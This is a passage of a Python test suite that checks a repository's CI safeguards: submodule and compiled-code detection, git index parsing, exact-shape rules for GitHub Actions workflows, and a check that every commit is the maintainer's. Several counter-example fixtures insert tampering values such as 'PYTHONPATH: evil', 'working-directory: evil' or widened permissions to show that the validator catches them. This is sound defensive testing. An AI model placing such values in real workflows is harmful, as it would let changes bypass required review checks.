        for words in ("kernel/ghost.pyc: compiled code", "kernel/__pycache__/y.cpython-39.pyc: compiled code",
                      "kernel/__pycache__/y.cpython-39.pyc: in __pycache__/", "corpus/d.jsonl: in corpus/",
                      "docs/.gitmodules: declares a submodule"):
            self.assertTrue(caught(problems, words), words)
        self.assertEqual(len([p for p in problems if p.startswith("sim/z.PYC: compiled code")]), 1)   # on disk, once

    def test_a_submodule_is_refused(self):
        # A submodule's files come from another repo, at a commit this one's review never sees. Checked
        # out, it holds a .git file, and the walk skips it as another working tree.
        root = tree({".gitmodules": "[submodule \"lib\"]\n\tpath = kernel/lib\n", "kernel/lib/.git": "gitdir: x\n",
                     "kernel/lib/clock.py": "import time\n", "docs/.gitmodules": "", "sim/.GITMODULES": ""})
        commit(root, {".gitmodules": FILE, "kernel/lib": GITLINK, "docs/.gitmodules": FILE, "sim/.GITMODULES": FILE})
        problems = check_repo.run(root)
        for words in ("kernel/lib: a submodule; its files come from another repo",
                      ".gitmodules: declares a submodule", "docs/.gitmodules: declares a submodule",
                      "sim/.GITMODULES: declares a submodule"):
            self.assertTrue(caught(problems, words), words)
        self.assertFalse(caught(check_purity.run(root), "clock.py"))      # why: unread, yet importable

    def test_an_index_that_cannot_be_read_is_a_problem_and_skips_nothing(self):
        files = {"kernel/x.py": "", "sim/__pycache__/x.cpython-39.pyc": ""}
        whole = git_index({"kernel/x.py": FILE})
        split = whole[:-20] + b"link" + bytes(4)
        for name, data in (("garbage", b"not an index"), ("version 5", whole[:4] + (5).to_bytes(4, "big") + whole[8:]),
                           ("short", whole[:40]), ("checksum", whole[:-1] + b"x"),
                           ("split", split + hashlib.sha1(split, usedforsecurity=False).digest())):
            with self.subTest(index=name):
                root = commit(tree(files), {})
                (root / ".git" / "index").write_bytes(data)
                problems = check_repo.run(root)
                self.assertTrue(caught(problems, "git's index cannot be read"))
                self.assertTrue(caught(problems, "sim/__pycache__/x.cpython-39.pyc: compiled code"))
        root = tree(dict(files, **{".git": "no gitdir here\n"}))
        self.assertTrue(caught(check_repo.run(root), "git's index cannot be read"))
        # Broken the ways git never writes: version 4 cutting more from a path than the one before it
        # holds (the first has none before it), and an extension that runs past the end.
        real = staged({"kernel/x.py": "", "kernel/y.py": ""}, "index.version=4")
        whole = (real / ".git" / "index").read_bytes()
        cut = bytearray(whole[:-20])
        cut[12 + 62] = 5
        for data, words in ((checked(bytes(cut)), "a path is cut by more than it holds"),
                            (checked(whole[:-20] + b"ZZZZ" + (99).to_bytes(4, "big")), "it ends early")):
            with self.subTest(words=words):
                (real / ".git" / "index").write_bytes(data)
                self.assertTrue(caught(check_repo.run(real), "git's index cannot be read (%s)" % words))
        # One that cannot be opened is a sentence, not a traceback.
        root = commit(tree(files), {})
        (root / ".git" / "index").unlink()
        (root / ".git" / "index").mkdir()
        self.assertTrue(caught(check_repo.run(root), "git's index cannot be read (it cannot be opened"))
        self.assertTrue(caught(check_repo.run(root), "sim/__pycache__/x.cpython-39.pyc: compiled code"))


class Workflows(unittest.TestCase):
    def test_the_example_passes_and_every_rule_has_been_tripped(self):
        self.assertEqual(check_workflows.run(), [])

    def test_a_rule_with_no_counter_example_is_caught(self):
        problems = check_workflows.run(tree({"examples/workflows/verify.yml": GOOD}))
        self.assertEqual(len(problems), len(check_workflows.RULES))

    def test_a_counter_example_must_break_its_rule_and_no_other(self):
        both = GOOD.replace("ubuntu-24.04", "ubuntu-latest").replace("    timeout-minutes: 25\n", "")
        root = clone({"examples/workflows/invalid/runner.two-faults.yml": both,
                      "examples/workflows/invalid/soft.no-fault.yml": GOOD})
        problems = check_workflows.run(root)
        self.assertTrue(caught(problems, "runner.two-faults.yml: must break the rule 'runner' and no other"))
        self.assertTrue(caught(problems, "soft.no-fault.yml: must break the rule 'soft' and no other, and breaks none"))

    def test_an_example_in_the_standard_that_has_drifted_is_caught(self):
        root = tree({"examples/workflows/verify.yml": GOOD,
                     "docs/standards/workflows.md": "```yaml\n" + GOOD.replace("minutes: 25", "minutes: 90") + "```\n"})
        self.assertTrue(caught(check_workflows.run(root), "word for word"))

    def test_the_required_check_that_has_drifted_from_its_example_is_caught(self):
        root = tree({"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD.replace("minutes: 25", "minutes: 45")})
        self.assertTrue(caught(check_workflows.run(root), "change both together"))
        bumped = GOOD.replace("3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1", "a" * 40 + " # v8.0.0")
        root = tree({"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": bumped})
        self.assertFalse(caught(check_workflows.run(root), "change both together"))

    def test_a_lens_read_from_a_workflow_that_does_not_run_its_check_is_caught(self):
        # Each required Lens GitHub Actions runs is read only from the workflow file the configuration names for it. A
        # file that is gone, or that runs no job under the Lens's check name, would leave every pull request's check
        # another file's, and the Lens unreadable on all of them.
        defaults = json.loads((ROOT / "config" / "defaults.json").read_text())
        lenses = defaults["required_lenses"]["deterministic"]
        run_by_actions = [lens for lens in lenses if isinstance(lens["workflow"], str)]
        self.assertTrue(run_by_actions)
        for lens in run_by_actions:
            other = next(x["workflow"] for x in run_by_actions if x["workflow"] != lens["workflow"])
            for path, said in ((".github/workflows/gone.yml", "which does not exist"),
                               (other, "runs no job named %r" % lens["check"])):
                moved = [dict(x, workflow=path) if x is lens else x for x in lenses]
                cfg = dict(defaults, required_lenses=dict(defaults["required_lenses"], deterministic=moved))
                root = clone({"config/defaults.json": json.dumps(cfg, indent=2) + "\n"})
                self.assertTrue(caught(check_workflows.run(root), said), (lens["lens"], path))
            # The job renamed in its own file.
            text = (ROOT / lens["workflow"]).read_text()
            renamed = text.replace("    name: %s\n" % lens["check"], "    name: %s-renamed\n" % lens["check"])
            self.assertNotEqual(renamed, text, lens["lens"])
            root = clone({lens["workflow"]: renamed})
            self.assertTrue(caught(check_workflows.run(root), "runs no job named %r" % lens["check"]), lens["lens"])

    def lens_problems(self, text: str, lens: str = "verify") -> list:
        """The problems check_workflows finds when the Lens `lens` is read from a workflow file holding `text`."""
        defaults = json.loads((ROOT / "config" / "defaults.json").read_text())
        lenses = [dict(x, workflow=".github/workflows/lens.yml") if x["lens"] == lens else x
                  for x in defaults["required_lenses"]["deterministic"]]
        cfg = dict(defaults, required_lenses=dict(defaults["required_lenses"], deterministic=lenses))
        root = clone({"config/defaults.json": json.dumps(cfg, indent=2) + "\n", ".github/workflows/lens.yml": text})
        return [p for p in check_workflows.run(root) if "the Lens %s" % lens in p]

    def test_only_a_jobs_own_name_or_its_id_names_a_lens_check(self):
        # GitHub names a job's check run by the job's own name, or by its id where it has none. A workflow's name, or a
        # step's, names no check run.
        self.assertEqual(self.lens_problems(GOOD), [])
        self.assertEqual(self.lens_problems(GOOD.replace("    name: verify\n", "")), [])
        elsewhere = GOOD.replace("name: factory\n", "name: verify\n").replace("  verify:\n    name: verify\n", "  build:\n")
        elsewhere = elsewhere.replace("      - run: make verify\n", "      - name: verify\n        run: make verify\n")
        self.assertNotEqual(elsewhere, GOOD)
        self.assertTrue(caught(self.lens_problems(elsewhere), "runs no job named 'verify'"))
        renamed = GOOD.replace("  verify:\n    name: verify\n", "  verify:\n    name: build\n")
        self.assertTrue(caught(self.lens_problems(renamed), "runs no job named 'verify'"))

    def test_a_lens_job_that_would_never_report_under_its_name_is_caught(self):
        # A matrix names each of its check runs after the job and its values; a job-level if: can skip the job; a job
        # that calls a reusable workflow reports under the caller's and the callee's names; and a workflow that does not
        # run on both pull_request and merge_group reports on no head, or not in the merge queue. Each leaves the Lens
        # waiting for ever. The one if: allowed is always(), beside needs:, and a job that needs others is skipped when
        # one fails, which passes a required check, unless it runs under always() and judges every other job.
        needs = "    needs:\n      - checks\n      - commits\n      - mutants\n"
        judge = "      - run: python3 -m tools.needs_passed\n"
        given = "    env:\n      NEEDS: ${{ toJSON(needs) }}\n"
        matrix = GOOD.replace("    timeout-minutes: 10\n",
                              "    timeout-minutes: 10\n    strategy:\n      matrix:\n        python:\n          - 3.9\n")
        called = GOOD.split(needs)[0] + "    uses: combsmith/factory/.github/workflows/v.yml@v1-stable\n"
        other_if = "has a job-level if: other than always() beside needs:"
        cases = [(matrix, "has a strategy.matrix"),
                 (GOOD.replace("    if: always()\n", "    if: github.event_name == 'pull_request'\n"), other_if),
                 (GOOD.replace("    if: always()\n", "    if: ${{ always() }}\n"), other_if),
                 (GOOD.replace(needs, ""), other_if),
                 (called, "calls a reusable workflow with uses:"),
                 (GOOD.replace("  merge_group:\n", ""), "not on both pull_request and merge_group"),
                 (GOOD.replace("  pull_request:\n", ""), "not on both pull_request and merge_group"),
                 (GOOD.replace("    if: always()\n", ""), "it has no job-level if: always()"),
                 (GOOD.replace("      - mutants\n", ""), "not every other job in its file"),
                 (GOOD.replace(needs, "    needs: checks\n"), "it needs checks, not every other job in its file"),
                 (GOOD.replace("      - mutants\n", "      - mutants\n      - deploy\n"), "not every other job in its file"),
                 (GOOD.replace(needs, "    needs: [checks, commits, mutants]\n"), "its needs: cannot be read as a list of jobs"),
                 (GOOD.replace(judge, "      - run: make verify\n"), "it runs no step `python3 -m tools.needs_passed`"),
                 (GOOD.replace(judge, judge + "        if: false\n"), "an if: can skip its step"),
                 (GOOD.replace(given, ""), "it does not give NEEDS"),
                 (GOOD.replace("toJSON(needs)", "toJSON(needs.checks)"), "it does not give NEEDS"),
                 (GOOD.replace(judge, judge + "        env:\n          NEEDS: '{}'\n"), "it does not give NEEDS"),
                 (GOOD.replace(needs, "").replace("    if: always()\n", "").replace(given, "")
                  .replace(judge, "      - run: make verify\n"), "it has no needs:, so the other jobs in its file"),
                 (GOOD.split("  checks:\n")[0] + "  verify:\n" + GOOD.split("  verify:\n")[1],
                  "it needs checks, commits, mutants, not every other job in its file, none"),
                 (GOOD.replace(judge, "      - run: |\n          make fast\n          python3 -m tools.needs_passed\n"),
                  "it runs no step `python3 -m tools.needs_passed`, on a line of its own"),
                 (GOOD.replace(judge, "      - run: >\n          python3 -m tools.verify\n          python3 -m tools.needs_passed\n"),
                  "it runs no step `python3 -m tools.needs_passed`, on a line of its own"),
                 (GOOD.replace(judge, judge + "      - run: make verify\n"), "its steps are more than a checkout"),
                 (GOOD.replace(judge, "      - uses: actions/github-script@" + "a" * 40 + " # v7\n" + judge),
                  "its steps are more than a checkout")]
        for text, said in cases:
            self.assertNotEqual(text, GOOD, said)
            self.assertTrue(caught(self.lens_problems(text), said), said)
        # The list of what it needs may stand at the indent of its key, as YAML allows.
        level = GOOD.replace(needs, "    needs:\n    - mutants\n    - commits\n    - checks\n")
        spaced = GOOD.replace(needs, "    needs:\n      - checks\n      - commits\n\n      # the shards\n      - mutants\n")
        for text in (level, spaced):
            self.assertNotEqual(text, GOOD)
            self.assertEqual(self.lens_problems(text), [])

    def test_the_commits_job_reads_the_pull_requests_commits_from_the_base(self):
        # Decision 0041: the job commits checks out the base with the whole history, is told the base, the head and the
        # event by the event's expressions, and runs the base's tools/commits_are_the_maintainers.py on a line of its
        # own, with nothing else that could act for it.
        job = GOOD[GOOD.index("  commits:\n"):GOOD.index("  verify:\n")]
        reading = "      - run: python3 -m tools.commits_are_the_maintainers\n"
        depth = "          fetch-depth: 0\n          ref: %s\n" % check_workflows.BASE
        self.assertEqual((job.count(reading), job.count(depth)), (1, 1))
        shape = "its job commits's steps are not a checkout"
        cases = [(GOOD.replace(job, "").replace("      - commits\n", ""), "has no job commits"),
                 (GOOD.replace(job, job.replace("    env:\n", "    if: always()\n    env:\n")), "has keys other than"),
                 (GOOD.replace(job, job.replace("    env:\n", "    container: ghcr.io/x/y:1\n    env:\n")), "has keys other than"),
                 (GOOD.replace(job, job.replace("    env:\n", "    strategy:\n      matrix:\n        a:\n          - 1\n    env:\n")),
                  "has keys other than"),
                 (GOOD.replace(job, job.replace("    timeout-minutes: 10\n", "")), "has keys other than"),
                 (GOOD.replace(job, job.replace("      contents: read\n", "      contents: write\n")), "granted other than"),
                 (GOOD.replace(job, job.replace("      EVENT: ${{ github.event_name }}\n", "")), "is not told BASE_SHA"),
                 (GOOD.replace(job, job.replace("github.event.merge_group.head_sha", "github.sha")), "is not told BASE_SHA"),
                 (GOOD.replace(job, job.replace(depth, "          ref: %s\n" % check_workflows.BASE)), "whole history"),
                 (GOOD.replace(job, job.replace(depth, "          fetch-depth: 0\n")), "check out the base alone"),
                 (GOOD.replace(job, job.replace(depth, depth.replace("base.sha", "head.sha"))), "check out the base alone"),
                 (GOOD.replace(job, job.replace(reading, "      - run: make verify\n")), "runs no step"),
                 (GOOD.replace(job, job.replace(reading, reading + "        if: false\n")), shape),
                 (GOOD.replace(job, job.replace(reading, reading + "        env:\n          BASE_SHA: abc\n")), shape),
                 (GOOD.replace(job, job.replace(reading, reading + "        shell: bash\n")), shape),
                 (GOOD.replace(job, job.replace(reading, reading + "      - run: make verify\n")), shape),
                 (GOOD.replace(job, job.replace(reading, "      - uses: actions/github-script@" + "a" * 40 + " # v7\n" + reading)),
                  shape)]
        for text, said in cases:
            self.assertNotEqual(text, GOOD, said)
            self.assertTrue(caught(self.lens_problems(text), said), said)
        self.assertEqual(self.lens_problems(GOOD), [])

    def test_the_judging_step_and_its_checkout_are_held_to_their_exact_shape(self):
        # Issue 180: a working-directory: on the judging step would run another tree's tools/needs_passed.py, a shell:
        # or an env: on it or a container: on the job would change how it runs, and a missing checkout would leave no
        # base to judge from. The job's keys, its permissions, and each step's keys are held exactly.
        judge = "      - run: python3 -m tools.needs_passed\n"
        base = ("      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n"
                "          persist-credentials: false\n          ref: %s\n" % check_workflows.BASE)
        self.assertEqual((GOOD.count(judge), GOOD.count(base)), (1, 1))
        shape = "its steps are not a checkout"
        cases = [(GOOD.replace(judge, judge + "        working-directory: evil\n"), shape),
                 (GOOD.replace(judge, judge + "        shell: bash\n"), shape),
                 (GOOD.replace(judge, judge + "        env:\n          NEEDS: '{}'\n"), shape),
                 (GOOD.replace(base, ""), "its one checkout is not of the base alone"),
                 (GOOD.replace("      contents: read\n    env:\n      NEEDS:", "      contents: read\n      issues: write\n    env:\n      NEEDS:"),
                  "granted other than"),
                 (GOOD.replace("    env:\n      NEEDS:", "    container: ghcr.io/x/y:1\n    env:\n      NEEDS:"), "has keys other than"),
                 (GOOD.replace("    env:\n      NEEDS:", "    defaults:\n      run:\n        working-directory: evil\n    env:\n      NEEDS:"),
                  "has keys other than"),
                 (GOOD.replace("    env:\n      NEEDS:", "    permissions:\n      contents: write\n    env:\n      NEEDS:"), "granted other than")]
        verify = GOOD[GOOD.index("  verify:\n"):]
        cases.append((GOOD.replace(verify, verify.replace("      contents: read\n", "      contents: write\n")),
                      "granted other than"))
        # Its env: is NEEDS alone, and the file has no top-level env: for the jobs to inherit: a PYTHONPATH there would
        # change the interpreter that runs the base's tools/needs_passed.py.
        cases.append((GOOD.replace(verify, verify.replace("      NEEDS:", "      PYTHONPATH: evil\n      NEEDS:")),
                      "its env: holds other than NEEDS"))
        cases.append((GOOD.replace("jobs:\n", "env:\n  PYTHONPATH: evil\njobs:\n"), "has a top-level env:"))
        cases.append((GOOD.replace("jobs:\n", "defaults:\n  run:\n    working-directory: evil\njobs:\n"), "has a top-level defaults:"))
        for text, said in cases:
            self.assertNotEqual(text, GOOD, said)
            self.assertTrue(caught(self.lens_problems(text), said), said)
        # Two with: blocks on the checkout, which a reader would refuse or merge into a checkout of the head, are not
        # the narrow form: the check never merges what no reader yields.
        split = base.replace("        with:\n          persist-credentials: false\n          ref:",
                             "        with:\n          ref: %s\n        with:\n          persist-credentials: false\n"
                             "          ref:" % check_workflows.BASE)
        self.assertNotEqual(split, base)
        self.assertIn("form", rules(GOOD.replace(base, split)))
        self.assertEqual(self.lens_problems(GOOD), [])

    def test_the_mutant_shards_are_told_their_index_and_count_by_the_matrix(self):
        # Issue 180: MUTANTS_SHARD written as a number would make every leg run one shard, and MUTANTS_SHARDS written as
        # a number could differ from the matrix's size; each is the matrix's own expression, the matrix is the one key
        # shard, and the job's shape is held exactly, as the judging job's is.
        job = GOOD[GOOD.index("  mutants:\n"):GOOD.index("  commits:\n")]
        index, total = "      MUTANTS_SHARD: ${{ strategy.job-index }}\n", "      MUTANTS_SHARDS: ${{ strategy.job-total }}\n"
        run = "      - run: python3 -m tools.mutants\n"
        self.assertEqual((job.count(index), job.count(total), job.count(run)), (1, 1, 1))
        told, shape = "not told MUTANTS_SHARD", "whose steps are not a checkout of the head"
        cases = [(index, "      MUTANTS_SHARD: 0\n", told), (total, "      MUTANTS_SHARDS: 8\n", told),
                 (total, "", told), (index, index + "      OTHER: 1\n", told),
                 ("        shard:\n", "        leg:\n", "not the one key shard"),
                 ("    env:\n      MUTANTS_SHARD", "    container: ghcr.io/x/y:1\n    env:\n      MUTANTS_SHARD", "keys other than"),
                 ("      contents: read\n", "      contents: write\n", "granted other than"),
                 ("      contents: read\n", "      contents: read\n      issues: write\n", "granted other than"),
                 (run, run + "        working-directory: evil\n", shape), (run, run + "        env:\n          MUTANTS_SHARD: 0\n", shape),
                 (run, run + "      - run: make verify\n", shape),
                 (run, "      - run: python3 -m tools.mutants --quick\n", shape),
                 (run, "      - run: |\n          python3 -m tools.mutants\n", shape),
                 ("          fetch-depth: 0\n      - run: python3 -m tools.mutants\n", "      - run: python3 -m tools.mutants\n", shape)]
        for old, new, said in cases:
            text = GOOD.replace(job, job.replace(old, new))
            self.assertNotEqual(text, GOOD, said)
            self.assertTrue(caught(self.lens_problems(text), said), (old, new, said))
        # No job runs the mutants at all, or the job that did runs something else: the gate is gone, not reshaped.
        self.assertIn("form", rules(GOOD.replace(job, job.replace("          fetch-depth: 0\n", "        with:\n          fetch-depth: 0\n"))))
        gone = "has no job that runs the mutants"
        self.assertTrue(caught(self.lens_problems(GOOD.replace(job, "").replace("      - mutants\n", "")), gone))
        self.assertTrue(caught(self.lens_problems(GOOD.replace(job, job.replace(run, "      - run: make verify\n"))), gone))
        self.assertEqual(self.lens_problems(GOOD), [])

    def test_a_lens_job_that_judges_its_needs_runs_from_the_base(self):
        # verify's verdict is the base's tools/needs_passed.py: its one checkout is of the base, on a pull request and in
        # the merge queue, and of nothing else, so a change cannot make its own verdict pass (decision 0023).
        ref = "          ref: %s\n" % check_workflows.BASE
        self.assertIn(ref, GOOD)
        said = "its one checkout is not of the base alone"
        head = "      - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n        with:\n          persist-credentials: false\n"
        mine = ("    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
                "        with:\n          persist-credentials: false\n" + ref)
        self.assertEqual(GOOD.count(mine), 1)
        cases = [GOOD.replace(ref, ""),
                 GOOD.replace(ref, "          ref: ${{ github.event.pull_request.base.sha }}\n"),
                 GOOD.replace(ref, "          ref: ${{ github.event.merge_group.base_sha }}\n"),
                 GOOD.replace(ref, ref.replace(" }}", " || github.sha }}")),
                 GOOD.replace(ref, ref.replace(" }}", " || github.event.pull_request.head.sha }}")),
                 GOOD.replace(ref, "          ref: main\n"),
                 GOOD.replace(ref, ref + "          path: base\n"),
                 GOOD.replace(ref, ref + "          repository: someone/else\n"),
                 GOOD.replace(ref, ref + "          fetch-depth: 0\n"),
                 GOOD.replace("      - run: python3 -m tools.needs_passed\n", head + "      - run: python3 -m tools.needs_passed\n"),
                 GOOD.replace(mine, "    steps:\n" + head.replace("false\n", "false\n          path: head\n")
                              + mine[len("    steps:\n"):]),
                 GOOD.replace(mine, "    steps:\n")]
        for text in cases:
            self.assertNotEqual(text, GOOD)
            self.assertTrue(caught(self.lens_problems(text), said), text)
        self.assertFalse(caught(self.lens_problems(GOOD), said))
        # On any other event there is no base: `ref:` would come out empty, and the checkout would be the head's.
        empty = "where there is no base to check out"
        for event in ("  push:\n", "  workflow_dispatch:\n", "  schedule:\n    - cron: '17 3 * * *'\n"):
            text = GOOD.replace("  merge_group:\n", "  merge_group:\n" + event)
            self.assertNotEqual(text, GOOD)
            self.assertTrue(caught(self.lens_problems(text), empty), event)
        for event in ("push", "workflow_dispatch"):
            text = GOOD.replace("on:\n  pull_request:\n  merge_group:\n", "on: %s\n" % event)
            self.assertNotEqual(text, GOOD)
            self.assertTrue(caught(self.lens_problems(text), "its workflow runs on %s, where there is no base" % event),
                            event)
        self.assertFalse(caught(self.lens_problems(GOOD), empty))

    def test_the_required_check_fails_unless_every_job_it_needs_passed(self):
        # `verify` runs under always(), so it reports whatever the jobs it needs did, and only every one's success
        # passes it. Needs it cannot read, or that name no job, fail it too.
        passed = {"checks": {"result": "success", "outputs": {}}, "mutants": {"result": "success", "outputs": {}}}
        self.assertEqual(needs_passed.problems(json.dumps(passed)), [])
        for result in ("failure", "cancelled", "skipped", "Success", None, True):
            said = needs_passed.problems(json.dumps(dict(passed, mutants={"result": result, "outputs": {}})))
            self.assertTrue(caught(said, "the job mutants ended"), result)
        self.assertTrue(caught(needs_passed.problems(json.dumps({"checks": "success"})), "the job checks ended"))
        for text in (None, "", "{", "null", "[]", '"success"'):
            self.assertTrue(caught(needs_passed.problems(text), "cannot be read") or
                            caught(needs_passed.problems(text), "names no job"), text)
        self.assertTrue(caught(needs_passed.problems("{}"), "names no job"))
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(needs_passed.main({"NEEDS": json.dumps(passed)}), 0)
            self.assertEqual(needs_passed.main({"NEEDS": "{}"}), 1)
            self.assertEqual(needs_passed.main({}), 1)

    def test_every_commit_a_pull_request_carries_is_the_maintainers(self):
        # Issue 204: the required check reads each commit between the base and the head, fetched from origin, and
        # refuses unless its author and committer are the identity config/hooks.json names. On a merge group the head,
        # which the queue made, is read for its author alone. An empty range, a head it cannot fetch, or an identity
        # it cannot read refuses. No identity is written in the code: the fixture's Maintainer is not the repo's.
        ada, bob, github = ("Ada", "ada@example.com"), ("Bob", "bob@example.com"), ("GitHub", "noreply@github.com")
        origin, local = tree({"config/hooks.json": json.dumps({"maintainer": {"name": ada[0], "email": ada[1]}})}), None

        def run(where, *args, who=ada):
            env = dict(os.environ, GIT_AUTHOR_NAME=who[0], GIT_AUTHOR_EMAIL=who[1], GIT_COMMITTER_NAME=who[0],
                       GIT_COMMITTER_EMAIL=who[1], GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_NOSYSTEM="1")
            return subprocess.run(["git", *args], cwd=str(where), env=env, capture_output=True, text=True,
                                  timeout=60, check=True).stdout.strip()

        def commit(where, message, author=ada, committer=None):
            env = dict(os.environ, GIT_AUTHOR_NAME=author[0], GIT_AUTHOR_EMAIL=author[1],
                       GIT_COMMITTER_NAME=(committer or author)[0], GIT_COMMITTER_EMAIL=(committer or author)[1],
                       GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_NOSYSTEM="1")
            subprocess.run(["git", "commit", "-q", "--allow-empty", "-m", message], cwd=str(where), env=env,
                           capture_output=True, text=True, timeout=60, check=True)
            return run(where, "rev-parse", "HEAD")

        run(origin, "init", "-q", "-b", "main")
        run(origin, "config", "uploadpack.allowReachableSHA1InWant", "true")
        run(origin, "add", "-A")
        base = commit(origin, "base")
        local = origin.parent / "local"
        run(origin.parent, "clone", "-q", str(origin), str(local))

        def said(head, event="pull_request", root=None):
            return commits_are_the_maintainers.problems(root or local, {"BASE_SHA": base, "HEAD_SHA": head,
                                                                       "EVENT": event})
        # Commits the Maintainer made pass; the head is fetched from origin, which the clone does not yet hold.
        first = commit(origin, "one")
        second = commit(origin, "two")
        self.assertEqual(said(second), [])
        # Another author, or another committer, refuses, and the commit is named.
        other = commit(origin, "three", author=bob, committer=ada)
        self.assertTrue(caught(said(other), "%s is authored by Bob <bob@example.com>" % other[:7]))
        self.assertFalse(caught(said(other), "committed by"))
        run(origin, "reset", "-q", "--hard", second)
        other = commit(origin, "three", committer=bob)
        self.assertTrue(caught(said(other), "%s is committed by Bob" % other[:7]))
        run(origin, "reset", "-q", "--hard", second)
        # On a merge group the head is the queue's: GitHub commits it, its author must still be the Maintainer; a
        # commit before it that GitHub committed is not the queue's, and refuses.
        squash = commit(origin, "squash", committer=github)
        self.assertEqual(said(squash, "merge_group"), [])
        self.assertTrue(caught(said(squash), "committed by GitHub"), "on a pull request the head is its own")
        run(origin, "reset", "-q", "--hard", second)
        wrong = commit(origin, "squash", author=bob, committer=github)
        self.assertTrue(caught(said(wrong, "merge_group"), "authored by Bob"))
        run(origin, "reset", "-q", "--hard", second)
        faked = commit(origin, "faked", committer=github)
        after = commit(origin, "after", committer=github)
        self.assertTrue(caught(said(after, "merge_group"), "%s is committed by GitHub" % faked[:7]))
        self.assertFalse(caught(said(after, "merge_group"), "%s is committed" % after[:7]))
        run(origin, "reset", "-q", "--hard", second)
        # A commit a merge carries is read too, not only the first parent's line.
        run(origin, "checkout", "-q", "-b", "side", second)
        side = commit(origin, "side", author=bob, committer=ada)
        run(origin, "checkout", "-q", "main")
        run(origin, "merge", "-q", "--no-ff", "-m", "merge side", "side")
        merged = run(origin, "rev-parse", "HEAD")
        self.assertTrue(caught(said(merged), "%s is authored by Bob" % side[:7]))
        run(origin, "reset", "-q", "--hard", second)
        run(origin, "branch", "-q", "-D", "side")
        # The name and the email are each the Maintainer's: either alone refuses.
        for who in (("Bob", ada[1]), (ada[0], "bob@example.com")):
            half = commit(origin, "half", author=who, committer=ada)
            self.assertTrue(caught(said(half), "%s is authored by" % half[:7]), who)
            run(origin, "reset", "-q", "--hard", second)
            half = commit(origin, "half", author=ada, committer=who)
            self.assertTrue(caught(said(half), "%s is committed by" % half[:7]), who)
            run(origin, "reset", "-q", "--hard", second)
        # Only the pull request's commits are read, not the base's own since the branch point: the base is the base
        # branch's tip, which the queue moved on with a commit GitHub made.
        run(origin, "checkout", "-q", "-b", "feature", second)
        mine = commit(origin, "mine")
        run(origin, "checkout", "-q", "main")
        moved = commit(origin, "another pull request, squashed", committer=github)
        run(local, "fetch", "-q", "origin", "main")      # the job checks the base out, so the clone holds it
        self.assertEqual(commits_are_the_maintainers.problems(local, {"BASE_SHA": moved, "HEAD_SHA": mine,
                                                                      "EVENT": "pull_request"}), [])
        run(origin, "reset", "-q", "--hard", second)
        run(origin, "branch", "-q", "-D", "feature")
        # An empty range, a head origin does not hold, or an event the check does not know, refuses.
        self.assertTrue(caught(said(base), "no commit lies between"))
        self.assertTrue(caught(said("0" * 40), "cannot be read"))
        for environ in ({}, {"BASE_SHA": base, "HEAD_SHA": second}, {"BASE_SHA": base, "HEAD_SHA": second, "EVENT": "push"}):
            self.assertTrue(caught(commits_are_the_maintainers.problems(local, environ), "must be set"), environ)
        # The identity is the configuration's, not the code's: told another Maintainer, every commit refuses.
        (local / "config" / "hooks.json").write_text(json.dumps({"maintainer": {"name": bob[0], "email": bob[1]}}))
        self.assertEqual(len(said(second)), 4, "two commits, each authored and committed by someone else")
        (local / "config" / "hooks.json").write_text("{}")
        self.assertTrue(caught(said(second), "cannot be read"))
        (local / "config" / "hooks.json").write_text(json.dumps({"maintainer": {"name": ada[0], "email": ada[1]}}))
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(commits_are_the_maintainers.main({"BASE_SHA": base, "HEAD_SHA": second,
                                                               "EVENT": "pull_request"}, local), 0)
            self.assertEqual(commits_are_the_maintainers.main({"BASE_SHA": base, "HEAD_SHA": base,
                                                               "EVENT": "pull_request"}, local), 1)

    def test_a_lens_run_by_actions_names_its_workflow_and_no_other_does(self):
        # GitHub Actions reports every job in the repo, so a Lens it runs must name its file; no other App runs one.
        defaults = json.loads((ROOT / "config" / "defaults.json").read_text())
        for lens in defaults["required_lenses"]["deterministic"]:
            if lens["app_id"] == check_workflows.ACTIONS_APP:
                changed, said = dict(lens, workflow=None), "is run by GitHub Actions and names no workflow file"
            else:
                changed, said = dict(lens, workflow=".github/workflows/verify.yml"), "only GitHub Actions runs one"
            lenses = [changed if x is lens else x for x in defaults["required_lenses"]["deterministic"]]
            cfg = dict(defaults, required_lenses=dict(defaults["required_lenses"], deterministic=lenses))
            root = clone({"config/defaults.json": json.dumps(cfg, indent=2) + "\n"})
            self.assertTrue(caught(check_workflows.run(root), said), lens["lens"])

    def test_an_unreadable_lens_table_is_a_problem_and_the_check_goes_on(self):
        # A check collects every problem: a broken config/defaults.json is reported, and the workflows are still read.
        bad = (ROOT / "examples" / "workflows" / "invalid" / "pin.a-tag-can-move.yml").read_text()
        for text, said in (("{", "cannot be read"), ("{}", "cannot be read"),
                           ('{"required_lenses": {"deterministic": [1]}}', "is not a list of Lenses"),
                           ('{"required_lenses": {"deterministic": [{"lens": "verify", "app_id": 15368, '
                            '"workflow": ".github/workflows/verify.yml"}]}}', "names no check")):
            problems = check_workflows.run(tree({"config/defaults.json": text, ".github/workflows/verify.yml": GOOD,
                                                 ".github/workflows/x.yml": bad, "examples/workflows/verify.yml": GOOD}))
            self.assertTrue(caught(problems, said), text)
            self.assertTrue(caught(problems, ".github/workflows/x.yml: [pin]"), text)

    def test_a_live_workflow_is_held_to_the_rules(self):
        bad = (ROOT / "examples" / "workflows" / "invalid" / "pin.a-tag-can-move.yml").read_text()
        problems = check_workflows.run(tree({".github/workflows/x.yml": bad, "examples/workflows/verify.yml": GOOD}))
        self.assertTrue(caught(problems, ".github/workflows/x.yml: [pin]"))
        self.assertTrue(caught(problems, "holds workflows and not verify.yml"))
        self.assertTrue(caught(check_workflows.run(tree({".github/actions/setup/action.yml": "x"})), "a local action"))

    def test_the_secret_scan_has_rules(self):
        # gitleaks adds its default rules to a config file only when told to; without them it finds nothing.
        config = (ROOT / ".gitleaks.toml").read_text()
        self.assertRegex(config, r"(?m)^\[extend\]\s*\nuseDefault = true$", "the secret scan would run with no rules")
